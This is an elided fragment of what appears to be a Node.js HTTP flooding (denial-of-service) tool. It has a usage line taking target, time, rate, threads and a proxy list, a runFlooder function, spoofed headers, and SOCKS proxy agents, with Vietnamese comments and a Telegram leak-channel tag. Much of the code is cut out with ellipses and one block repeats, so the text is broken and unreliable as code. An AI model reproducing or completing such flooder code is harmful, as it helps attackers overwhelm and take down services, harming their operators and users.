...
const { HeaderGenerator } = require('header-generator');
 ...
 if (process.argv.length < 7){console.log(`node sex.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
 ...
 const args = {
     ...
     protocolProxies: process.argv[7],
}
...
headers["Referer"] = Ref;
 ...
 function runFlooder() {
  ...
  const proxyOptions = {
    ...
    // Kiểm tra loại proxy và tạo agent tương ứng
    let agent = null;
    if (args.protocolProxies.toLowerCase() === 'socks') {
        const SocksProxyAgent = require('socks-proxy-agent');
        agent = new SocksProxyAgent(`socks://${proxyOptions.host}:${proxyOptions.port}`);
    }
...
//t.me/leaksourceshare
    const tlsOptions = (() => {
      ...
      if (useTlsOption2) {
        ...
        // Tạo agent cho SOCKS Proxy nếu có
        let agent = null;
        if (args.protocolProxies.toLowerCase() === 'socks') {
            agent = new SocksProxyAgent(`socks://${proxyOptions.host}:${proxyOptions.port}`);
        }
